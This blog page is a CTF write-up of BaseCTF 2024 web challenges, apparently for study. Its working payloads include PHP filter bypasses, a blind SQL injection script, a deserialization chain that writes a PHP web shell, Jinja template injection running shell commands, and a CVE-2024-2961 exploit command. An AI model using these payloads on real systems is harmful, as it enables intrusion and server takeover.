
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>2024-Basectf记录 | d4wn&#39;blog</title>
    <meta name="author" content="d4wn" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>D4WN&#39;BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;D4WN&#39;BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>2024-Basectf记录</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/9/29
        </span>
        
        <span class="category">
            <a href="/categories/wp/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                wp
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/wp/" style="color: #00bcd4">
                    wp
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/ctf/" style="color: #ffa2c4">
                    ctf
                </a>
            </span>
            
        </span>
        
    </div>

    
        <div class="content-container">
            <div id="toc" class="toc">
                <strong class="sidebar-title">目录</strong>
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Week3-ez-php-jail"><span class="toc-text">[Week3] ez_php_jail</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week4-only-one-sql"><span class="toc-text">[Week4] only one sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fin-1z-php"><span class="toc-text">[Fin] 1z_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fin-ez-php"><span class="toc-text">[Fin] ez_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fin-Lucky-Number"><span class="toc-text">[Fin] Lucky Number</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fin-Jinja-Mark"><span class="toc-text">[Fin] Jinja Mark</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fin-Just-Readme-%E5%89%8D%E7%BD%AE"><span class="toc-text">[Fin] Just Readme (前置)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fin-RCE-or-Sql-Inject"><span class="toc-text">[Fin] RCE or Sql Inject</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fin-Sql-Inject-or-RCE"><span class="toc-text">[Fin] Sql Inject or RCE</span></a></li></ol>
            </div>
            <div class="content" v-pre>
                <p>官方wp：</p>
<p><a target="_blank" rel="noopener" href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh</a></p>
<span id="more"></span>

<h1 id="Week3-ez-php-jail"><a href="#Week3-ez-php-jail" class="headerlink" title="[Week3] ez_php_jail"></a>[Week3] ez_php_jail</h1><pre><code class="php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&quot;hint.html&quot;);
$Jail = $_GET[&#39;Jail_by.Happy&#39;];

if($Jail == null) die(&quot;Do You Like My Jail?&quot;);

function Like_Jail($var) &#123;
    if (preg_match(&#39;/(`|\$|a|c|s|require|include)/i&#39;, $var)) &#123;
        return false;
    &#125;
    return true;
&#125;

if (Like_Jail($Jail)) &#123;
    eval($Jail);
    echo &quot;Yes! you escaped from the jail! LOL!&quot;;
&#125; else &#123;
    echo &quot;You will Jail in your life!&quot;;
&#125;
echo &quot;\n&quot;;

// 在HTML解析后再输出PHP源代码

?&gt;
</code></pre>
<p>payload：</p>
<pre><code class="http">highlight_file(glob(&quot;f*&quot;)[0]);
</code></pre>
<h1 id="Week4-only-one-sql"><a href="#Week4-only-one-sql" class="headerlink" title="[Week4] only one sql"></a>[Week4] only one sql</h1><pre><code class="php">&lt;?php
highlight_file(__FILE__);
$sql = $_GET[&#39;sql&#39;];
if (preg_match(&#39;/select|;|@|\n/i&#39;, $sql)) &#123;
    die(&quot;你知道的，不可能有sql注入&quot;);
&#125;
if (preg_match(&#39;/&quot;|\$|`|\\\\/i&#39;, $sql)) &#123;
    die(&quot;你知道的，不可能有RCE&quot;);
&#125;
//flag in ctf.flag
$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#39;没有select，让你执行一句又如何&#39;;&quot; . $sql . &quot;\&quot;&quot;;
system($query);
</code></pre>
<p>使用<code>sql</code>语法获取信息：</p>
<pre><code class="php">show%20databases
    
Database ctf information_schema mysql performance_schema sys test
</code></pre>
<pre><code class="php">show%20tables%20from%20ctf
    
Tables_in_ctf flag
</code></pre>
<pre><code class="php">show%20columns%20from%20ctf.flag
    
Field Type Null Key Default Extra 
    id varchar(300) YES NULL 
    data varchar(300) YES NULL
    
# 还有另外一种方式:
    DESC（或DESCRIBE）命令通常用于获取关于数据库中某个表的结构信息。
</code></pre>
<p>过滤掉了大部分内容，不能手动闭合双引号，没有分号，不能获取内容，<code>update</code>时间盲注：</p>
<ul>
<li>使用模糊匹配<code>like &#39;%&#39;</code></li>
<li>或者使用正则<code>where column regexp &#39;&#39;</code></li>
</ul>
<pre><code class="python">import requests
import string

URL = &#39;http://challenge.basectf.fun:27924/&#39;

char_list = string.ascii_uppercase + string.ascii_lowercase + string.digits + &#39;-&#39; + &quot;&#123;&#125;&quot;

flag = &#39;&#39;
while &#39;&#125;&#39; not in flag:
    for a_char in char_list:
        get_param = &#123;
            &#39;sql&#39;: f&#39;update flag set id=1 where data like \&#39;&#123;flag + a_char&#125;%\&#39; and sleep(5)&#39;
        &#125;
        try:
            rep = requests.get(url=URL, params=get_param, timeout=4)
            print(f&#39;test: &#123;a_char&#125;&#39;)
        except Exception as e:
            flag += a_char
            print(flag)
            break
</code></pre>
<p>这个大小写emm，<code>BaseCTF&#123;&#125;</code></p>
<h1 id="Fin-1z-php"><a href="#Fin-1z-php" class="headerlink" title="[Fin] 1z_php"></a>[Fin] 1z_php</h1><pre><code class="php">&lt;?php
highlight_file(&#39;index.php&#39;);
# 我记得她...好像叫flag.php吧？
$emp=$_GET[&#39;e_m.p&#39;];
$try=$_POST[&#39;try&#39;];
if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)
&#123;
    for ($i=0;$i&lt;strlen($emp);$i++)&#123;
        if (ctype_alpha($emp[$i]))&#123;
            die(&quot;你不是hacker？那请去外场等候！&quot;);
        &#125;
    &#125;
    echo &quot;只有真正的hacker才能拿到flag！&quot;.&quot;&lt;br&gt;&quot;;

    if (preg_match(&#39;/.+?HACKER/is&#39;,$try))&#123;
        die(&quot;你是hacker还敢自报家门呢？&quot;);
    &#125;
    if (!stripos($try,&#39;HACKER&#39;) === TRUE)&#123;
        die(&quot;你连自己是hacker都不承认，还想要flag呢？&quot;);
    &#125;

    $a=$_GET[&#39;a&#39;];
    $b=$_GET[&#39;b&#39;];
    $c=$_GET[&#39;c&#39;];
    if(stripos($b,&#39;php&#39;)!==0)&#123;
        die(&quot;收手吧hacker，你得不到flag的！&quot;);
    &#125;
    echo (new $a($b))-&gt;$c();
&#125;
else
&#123;
    die(&quot;114514到底是啥意思嘞？。？&quot;);
&#125;
# 觉得困难的话就直接把shell拿去用吧，不用谢~
$shell=$_POST[&#39;shell&#39;];
eval($shell);
?&gt;
</code></pre>
<ul>
<li><code>intval</code> 特定绕过方法绕过</li>
<li><code>preg_match</code>回溯次数绕过</li>
<li><code>php</code>伪协议，原生类<code>SplFileObject</code></li>
</ul>
<p>exp：</p>
<pre><code class="python">import requests

URL = &#39;h&#39;

try:
    data = &#123;
        &#39;try&#39;:&#39;jsa&#39;+ &#39;a&#39; * 1000000 + &#39;HACKER&#39;,
        &#39;a&#39;:&#39;SplFileObject&#39;,
        &#39;b&#39;:&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;,
        &#39;c&#39;:&#39;file&#39;
    &#125;
    param = &#123;
        &#39;e[m.p&#39;:&#39;114514.1&#39;,
        &#39;a&#39;:&#39;SplFileObject&#39;,
        &#39;b&#39;:&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;,
        &#39;c&#39;:&#39;fgets&#39;
    &#125;
    rep = requests.post(url=URL ,params=param, data=data)
    print(rep.text)
except Exception as e:
    print(e)
</code></pre>
<h1 id="Fin-ez-php"><a href="#Fin-ez-php" class="headerlink" title="[Fin] ez_php"></a>[Fin] ez_php</h1><pre><code class="php">&lt;?php
highlight_file(__file__);
function substrstr($data)
&#123;
    $start = mb_strpos($data, &quot;[&quot;);
    $end = mb_strpos($data, &quot;]&quot;);
    return mb_substr($data, $start + 1, $end - 1 - $start);
&#125;

class Hacker&#123;
    public $start;
    public $end;
    public $username=&quot;hacker&quot;;
    public function __construct($start)&#123;
        $this-&gt;start=$start;
    &#125;
    public function __wakeup()&#123;
        $this-&gt;username=&quot;hacker&quot;;
        $this-&gt;end = $this-&gt;start;
    &#125;

    public function __destruct()&#123;
        if(!preg_match(&#39;/ctfer/i&#39;,$this-&gt;username))&#123;
            echo &#39;Hacker！&#39;;
        &#125;
    &#125;
&#125;

class C&#123;
    public $c;
    public function __toString()&#123;
        $this-&gt;c-&gt;c();
        return &quot;C&quot;;
    &#125;
&#125;

class T&#123;
    public $t;
    public function __call($name,$args)&#123;
        echo $this-&gt;t-&gt;t;
    &#125;
&#125;
class F&#123;
    public $f;
    public function __get($name)&#123;
        return isset($this-&gt;f-&gt;f);
    &#125;

&#125;
class E&#123;
    public $e;
    public function __isset($name)&#123;
        ($this-&gt;e)();
    &#125;

&#125;
class R&#123;
    public $r;

    public function __invoke()&#123;
        eval($this-&gt;r);
    &#125;
&#125;

if(isset($_GET[&#39;ez_ser.from_you&#39;]))&#123;
    $ctf = new Hacker(&#39;&#123;&#123;&#123;'.$_GET['ez_ser.from_you'].'&#125;&#125;&#125;&#39;);
    if(preg_match(&quot;/\[|\]/i&quot;, $_GET[&#39;substr&#39;]))&#123;
        die(&quot;NONONO!!!&quot;);
    &#125;
    $pre = isset($_GET[&#39;substr&#39;])?$_GET[&#39;substr&#39;]:&quot;substr&quot;;
    $ser_ctf = substrstr($pre.&quot;[&quot;.serialize($ctf).&quot;]&quot;);
    $a = unserialize($ser_ctf);
    throw new Exception(&quot;杂鱼~杂鱼~&quot;);
&#125;
</code></pre>
<ul>
<li>宽字节注入</li>
<li>fast CG机制绕过<code>throw new Exception(&quot;杂鱼~杂鱼~&quot;);</code></li>
<li>使用指针来绕过<code>wake_up</code>赋值</li>
<li>传入参数漏洞</li>
<li>X-Powered-By: PHP&#x2F;7.3.11</li>
</ul>
<p>原始类反序列化：</p>
<pre><code class="php">O:6:&quot;Hacker&quot;:3:&#123;
    s:5:&quot;start&quot;;s:7:&quot;&#123;&#123;&#123;1&#125;&#125;&#125;&quot;;
    s:3:&quot;end&quot;;N;
    s:8:&quot;username&quot;;s:6:&quot;hacker&quot;;
&#125;
</code></pre>
<p><code>paylaod</code>：</p>
<pre><code class="php">a%3A2%3A%7Bi%3A0%3BO%3A6%3A%22Hacker%22%3A3%3A%7Bs%3A5%3A%22start%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A1%3A%22c%22%3BO%3A1%3A%22T%22%3A1%3A%7Bs%3A1%3A%22t%22%3BO%3A1%3A%22F%22%3A1%3A%7Bs%3A1%3A%22f%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A1%3A%22e%22%3BO%3A1%3A%22R%22%3A1%3A%7Bs%3A1%3A%22r%22%3Bs%3A74%3A%22system%28%22echo+PD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4%3D%7Cbase64+-d+%3E+shell.php%22%29%3B%22%3B%7D%7D%7D%7D%7Ds%3A3%3A%22end%22%3Bs%3A6%3A%22hacker%22%3Bs%3A8%3A%22username%22%3BR%3A9%3B%7Di%3A1%3Bs%3A1%3A%22a%22%3B%7D
    
a:2:&#123;
    i:0;O:6:&quot;Hacker&quot;:3:&#123;
        s:5:&quot;start&quot;;O:1:&quot;C&quot;:1:&#123;
            s:1:&quot;c&quot;;O:1:&quot;T&quot;:1:&#123;
                s:1:&quot;t&quot;;O:1:&quot;F&quot;:1:&#123;
                    s:1:&quot;f&quot;;O:1:&quot;E&quot;:1:&#123;
                        s:1:&quot;e&quot;;O:1:&quot;R&quot;:1:&#123;
                            s:1:&quot;r&quot;;s:74:&quot;system(&quot;echo PD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4=|base64 -d &gt; shell.php&quot;);&quot;;
                        &#125;
                    &#125;
                &#125;
            &#125;
        &#125;
        s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;
        s:8:&quot;username&quot;;R:9;
    &#125;
    i:1;s:1:&quot;a&quot;;
&#125;
</code></pre>
<p>组合：</p>
<pre><code class="php">&lt;?php
function substrstr($data)
&#123;
    $start = mb_strpos($data, &quot;[&quot;);
    $end = mb_strpos($data, &quot;]&quot;);
    return mb_substr($data, $start + 1, $end - 1 - $start);
&#125;
class Hacker&#123;
    public $start;
    public $end;
    public $username=&quot;hacker&quot;;
    public function __construct($start)&#123;
        $this-&gt;start=$start;
    &#125;
&#125;

$Strstr = serialize(new Hacker(&#39;&#123;&#123;&#123;'.'a:2:&#123;i:0;O:6:"Hacker":3:&#123;s:5:"start";O:1:"C":1:&#123;s:1:"c";O:1:"T":1:&#123;s:1:"t";O:1:"F":1:&#123;s:1:"f";O:1:"E":1:&#123;s:1:"e";O:1:"R":1:&#123;s:1:"r";s:74:"system("echo PD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4=|base64 -d > shell.php");";&#125;&#125;&#125;&#125;&#125;s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;s:8:&quot;username&quot;;R:9;&#125;i:1;s:1:&quot;a&quot;;&#125;&#39;.&#39;&#125;&#125;&#125;&#39;));
echo $Strstr;
echo &quot;\n\n&quot;;

echo substrstr(&quot;\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0\x80ab&quot;.&quot;[&quot;.$Strstr.&quot;]&quot;);
echo &quot;\n\n&quot;;

echo urlencode(&quot;\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0abc\xf0\x80ab&quot;);
</code></pre>
<h1 id="Fin-Lucky-Number"><a href="#Fin-Lucky-Number" class="headerlink" title="[Fin] Lucky Number"></a>[Fin] Lucky Number</h1><pre><code class="python">from flask import Flask,request,render_template_string,render_template
from jinja2 import Template
import json
import heaven
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, &#39;__getitem__&#39;):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

BLACKLIST_IN_index = [&#39;&#123;&#39;,&#39;&#125;&#39;]
def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

@app.route(&#39;/m4G1c&#39;,methods=[&#39;POST&#39;, &#39;GET&#39;])
def pollute():
    if request.method == &#39;POST&#39;:
        if request.is_json:
            merge(json.loads(request.data), instance)
            result = heaven.create()
            message = result[&quot;message&quot;]
            return &quot;这个魔术还行吧
&quot; + message
        else:
            return &quot;我要json的魔术&quot;
    return &quot;记得用POST方法把魔术交上来&quot;


#heaven.py

def create(kon=&quot;Kon&quot;, pure=&quot;Pure&quot;, *, confirm=False):
    if confirm and &quot;lucky_number&quot; not in create.__kwdefaults__:
        return &#123;&quot;message&quot;: &quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;
    if confirm and &quot;lucky_number&quot; in create.__kwdefaults__:
        return &#123;&quot;message&quot;: &quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;, &quot;lucky_number&quot;: create.__kwdefaults__[&quot;lucky_number&quot;]&#125;

    return &#123;&quot;message&quot;: &quot;你有什么想创造的吗？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;
</code></pre>
<p>payload:</p>
<pre><code class="http">/m4G1c[post]
&#123;&quot;__class__&quot;: &#123;&quot;__init__&quot;: &#123;&quot;__globals__&quot;: &#123;&quot;heaven&quot;: &#123;&quot;create&quot;: &#123;&quot;__kwdefaults__&quot;: &#123;&quot;confirm&quot;: true, &quot;lucky_number&quot;: 5346&#125;&#125;&#125;&#125;&#125;&#125;&#125;

/ssSstTti1[post]
flag=&#123;&#123;''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
</code></pre>
<h1 id="Fin-Jinja-Mark"><a href="#Fin-Jinja-Mark" class="headerlink" title="[Fin] Jinja Mark"></a>[Fin] Jinja Mark</h1><pre><code class="python">BLACKLIST_IN_index = [&#39;&#123;&#39;,&#39;&#125;&#39;]

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, &#39;__getitem__&#39;):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

@app.route(&#39;/magic&#39;, methods=[&#39;POST&#39;, &#39;GET&#39;])
def pollute():
    if request.method == &#39;POST&#39;:
        if request.is_json:
            merge(json.loads(request.data), instance)
            return &quot;这个魔术还行吧&quot;
        else:
            return &quot;我要json的魔术&quot;
    return &quot;记得用POST方法把魔术交上来&quot;
</code></pre>
<p>emmm，</p>
<pre><code class="python">if &#39;&#39; in &#39;sajhflksdfaj&#39;:
    print(&#39;yes&#39;)
</code></pre>
<p>payload：</p>
<pre><code class="http">/magic[post]
&#123;&quot;__class__&quot;: &#123;&quot;__init__&quot;: &#123;&quot;__globals__&quot;: &#123;&quot;BLACKLIST_IN_index&quot;: []&#125;&#125;&#125;&#125;

/index[post]
flag=&#123;&#123;''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
</code></pre>
<h1 id="Fin-Just-Readme-前置"><a href="#Fin-Just-Readme-前置" class="headerlink" title="[Fin] Just Readme (前置)"></a>[Fin] Just Readme (前置)</h1><pre><code class="php">echo file_get_contents($_POST[&#39;file&#39;]);
</code></pre>
<p>作者：<a target="_blank" rel="noopener" href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1#sql-injection-to-rce">Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1) (ambionics.io)</a></p>
<p><code>cve-2024-2961</code>，这是一个在PHP应用中将文件读取基本操作转换为<code>RCE</code>远程代码执行的利用方式。</p>
<pre><code class="bash">python3 cnext-exploit.py http://challenge.basectf.fun:46546/ &quot;echo PD9waHAgc3lzdGVtKCIvcmVhZGZsYWciKTs/Pg==|base64 -d &gt; b.php&quot;
</code></pre>
<h1 id="Fin-RCE-or-Sql-Inject"><a href="#Fin-RCE-or-Sql-Inject" class="headerlink" title="[Fin] RCE or Sql Inject"></a>[Fin] RCE or Sql Inject</h1><pre><code class="php">&lt;?php
highlight_file(__FILE__);
$sql = $_GET[&#39;sql&#39;];
if (preg_match(&#39;/se|ec|;|@|del|into|outfile/i&#39;, $sql)) &#123;
    die(&quot;你知道的，不可能有sql注入&quot;);
&#125;
if (preg_match(&#39;/&quot;|\$|`|\\\\/i&#39;, $sql)) &#123;
    die(&quot;你知道的，不可能有RCE&quot;);
&#125;
$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#39;ctfer! You can\\&#39;t succeed this time! hahaha&#39;; -- &quot; . $sql . &quot;\&quot;&quot;;
system($query);
</code></pre>
<p>根据题目提示，利数据库的命令执行：</p>
<pre><code class="mysql">%0asystem env
</code></pre>
<h1 id="Fin-Sql-Inject-or-RCE"><a href="#Fin-Sql-Inject-or-RCE" class="headerlink" title="[Fin] Sql Inject or RCE"></a>[Fin] Sql Inject or RCE</h1><pre><code class="php">&lt;?php
highlight_file(__FILE__);
$sql = $_GET[&#39;sql&#39;];
if (preg_match(&#39;/se|ec|;|@|del|into|outfile/i&#39;, $sql)) &#123;
    die(&quot;你知道的，不可能有sql注入&quot;);
&#125;
if (preg_match(&#39;/&quot;|\$|`|\\\\/i&#39;, $sql)) &#123;
    die(&quot;你知道的，不可能有RCE&quot;);
&#125;
$query = &quot;mysql -u root -p123456 -e \&quot;use ctf;select &#39;ctfer! You can\\&#39;t succeed this time! hahaha&#39;; -- &quot; . $sql . &quot;\&quot;&quot;;
system($query);
</code></pre>
<p>首先仍然是看</p>
<pre><code class="http">%0adelimiter%20//%0ahandler%20flag%20open%20as%20w//handler%20w%20read%20next
</code></pre>
<p>最后一个留个地址：</p>
<p><a target="_blank" rel="noopener" href="https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/">https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/</a></p>

            </div>
        </div>        
    

    
    
    
    
    
    
</div>
<script src="/js/toc.js"></script>
            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 d4wn&#39;blog
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;d4wn
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
